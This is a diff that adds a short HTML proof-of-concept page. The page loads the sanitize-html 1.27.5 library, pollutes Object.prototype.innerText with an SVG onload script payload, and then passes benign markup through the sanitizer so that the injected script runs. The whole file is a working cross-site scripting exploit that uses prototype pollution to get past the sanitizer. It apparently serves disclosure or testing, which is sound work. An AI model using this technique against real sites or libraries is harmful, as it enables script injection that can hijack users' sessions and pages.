@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
+</head>
+<body>
+  <script>
+    Object.prototype.innerText = '<svg onload=alert(1)></svg>';
+    document.write(sanitizeHtml('<div>hello</div>'))
+  </script>
+</body>
+</html>
